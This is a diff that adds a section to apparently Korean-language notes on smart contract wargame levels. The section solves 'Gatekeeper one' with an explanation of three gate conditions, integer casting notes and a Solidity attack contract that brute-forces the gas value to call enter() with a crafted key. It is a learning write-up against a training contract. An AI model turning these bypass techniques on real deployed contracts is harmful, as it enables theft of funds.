@@ -223,3 +223,37 @@ const key = await web3.eth.getStorageAt(contract.address,5)
 const parameter = web3.eth.abi.encodeParameter('bytes16',key) // bytes는 32byte padding을 할 때, padEnd를 사용함.
 await sendTransaction({from:player, to:contract.address, data:functionSignature+parameter.slice(2)})
 ```
+
+### Gatekeeper one
+조건 1. 컨트랙트로부터 call 해야함
+조건 2. 가스비가 8919로 나누어떨어져야함 -> 성공할 때까지 반복함
+조건 3. byte 타입 캐스팅에 관한 문제
+
+0xFFFFFFFF00000000 (8byte to hex)값 이후부터 uint16과 uint32는 오버플로우 발생
+
+```
+bytes8 = 64bit = 8byte
+uint16 = 16bit = 2byte
+uint32 = 32bit = 4byte
+uint64 = 64bit = 8byte
+uint200 = 200bit = 25byte
+```
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GateBreaker{
+    address public gateKeeper = 0x7Ed9884c1f79a2545afE713e557df7809e9d966D;
+    bytes8 public gateKey = 0xFFFFFFFF00006E11;
+
+    function breakGate() public{
+        bool success = false;
+        uint256 i=0;
+        while(!success){
+            (success, ) = gateKeeper.call{gas:819100 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            i++;
+        }
+    }
+}
+```
